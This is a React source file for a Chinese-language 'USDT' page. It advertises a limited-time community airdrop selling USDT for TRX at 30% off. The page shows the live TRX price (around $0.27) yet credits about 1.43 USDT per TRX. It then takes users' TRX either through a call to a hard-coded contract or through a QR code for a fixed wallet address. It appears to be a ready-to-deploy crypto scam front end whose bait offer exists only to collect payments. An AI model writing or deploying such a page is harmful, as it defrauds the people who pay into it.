import React, { useState, useEffect } from 'react';
import QRCode from 'react-qr-code';

const App = () => {
  const [trxAmount, setTrxAmount] = useState('');
  const [usdtAmount, setUsdtAmount] = useState('');
  const [trxPrice, setTrxPrice] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [showQR, setShowQR] = useState(false);
  const [qrString, setQrString] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState('');

  // 收款地址和合约地址
  const paymentAddress = 'TWRAzGd4KGgyESBbe4EFaADFMFgG999BcD';
  const contractAddress = 'TRVCzHHvW6PBXyxjXPTtoHKGyiJw7kThK6';

  // 初始化 TronLink 和 TRX 价格
  useEffect(() => {
    // 检查 TronLink 钱包
    const checkTronLink = async () => {
      if (window.tronWeb && window.tronWeb.ready) {
        setTronWeb(window.tronWeb);
      } else {
        const interval = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            setTronWeb(window.tronWeb);
            clearInterval(interval);
          }
        }, 1000);
        return () => clearInterval(interval);
      }
    };

    checkTronLink();

    // 获取 TRX 实时价格
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd')
      .then(res => res.json())
      .then(data => setTrxPrice(data.tron?.usd || 0.27))
      .catch(() => setTrxPrice(0.27));
  }, []);

  // 计算 USDT 数量
  const calculateUsdt = (trx) => {
    const val = parseFloat(trx);
    if (!val || !trxPrice) return '';
    return (val / 0.7).toFixed(4);
  };

  // 处理 TRX 输入
  const handleTrxChange = (e) => {
    const val = e.target.value;
    if (/^\d*\.?\d*$/.test(val)) {
      setTrxAmount(val);
      setUsdtAmount(calculateUsdt(val));
      setShowQR(false);
      setTransactionStatus('');
    }
  };

  // 处理购买逻辑
  const handleBuy = async () => {
    const val = parseFloat(trxAmount);
    if (!val || val <= 0) {
      setTransactionStatus('请输入有效的 TRX 数量');
      return;
    }

    setIsLoading(true);
    setTransactionStatus('');

    if (tronWeb) {
      try {
        const contract = await tronWeb.contract().at(contractAddress);
        const usdtAmountToBuy = parseFloat(calculateUsdt(val)) * 1e6;
        const amountInSun = tronWeb.toSun(val);

        const transaction = await contract.buy(usdtAmountToBuy).send({
          callValue: amountInSun,
          shouldPollResponse: true,
        });

        setTransactionStatus(`购买成功！交易ID: ${transaction}`);
        setTrxAmount('');
        setUsdtAmount('');
      } catch (error) {
        console.error(error);
        setTransactionStatus('购买失败：' + (error.message || '请重试'));
      }
    } else {
      const qrData = `tron:${paymentAddress}?amount=${val.toFixed(6)}`;
      setQrString(qrData);
      setShowQR(true);
      setTransactionStatus('请使用支持 TRON 的钱包扫描二维码进行支付');
    }

    setIsLoading(false);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 text-center space-y-5">
        {/* Logo 和标题 */}
        <div className="flex justify-center items-center space-x-3">
          <img
            src="https://i.imgur.com/pNAm2gN.png"
            alt="USDT Logo"
            className="w-10 h-10"
            onError={(e) => (e.target.style.display = 'none')}
          />
          <h1 className="text-2xl font-bold text-gray-800">USDT</h1>
        </div>

        {/* 宣传语 */}
        <p className="text-sm text-yellow-600 font-medium">
          社区空投活动：TRX 七折购买 USDT（限时优惠）
        </p>

        {/* 实时价格 */}
        <p className="text-lg font-semibold text-gray-700">
          实时价格：${trxPrice?.toFixed(2) || '0.27'} / TRX
        </p>

        {/* 输入框 */}
        <input
          type="text"
          placeholder="输入 TRX 数量"
          value={trxAmount}
          onChange={handleTrxChange}
          className="w-full border border-gray-300 rounded-lg py-3 px-4 text-center text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        {/* 可购买 USDT 显示 */}
        <div className="text-sm text-gray-600">
          可购买 USDT: <span className="font-semibold">{usdtAmount || '0.0000'}</span>
        </div>

        {/* 购买按钮 */}
        <button
          onClick={handleBuy}
          disabled={isLoading}
          className={`w-full bg-blue-500 text-white text-lg font-semibold py-3 rounded-lg transition ${isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-blue-600'}`}
        >
          {isLoading ? '处理中...' : '购买'}
        </button>

        {/* 交易状态 */}
        {transactionStatus && (
          <p className={`text-sm ${transactionStatus.includes('成功') ? 'text-green-600' : 'text-red-600'}`}>
            {transactionStatus}
          </p>
        )}

        {/* 二维码展示 */}
        {showQR && qrString && (
          <div className="pt-4 space-y-2">
            <QRCode value={qrString} className="w-[150px] h-[150px] mx-auto" />
            <p className="text-sm text-gray-500">请使用 TRON 钱包扫描二维码转账</p>
            <p className="text-xs text-gray-400 break-all">地址: {paymentAddress}</p>
            <p className="text-xs text-gray-400">金额: {trxAmount} TRX</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default App;
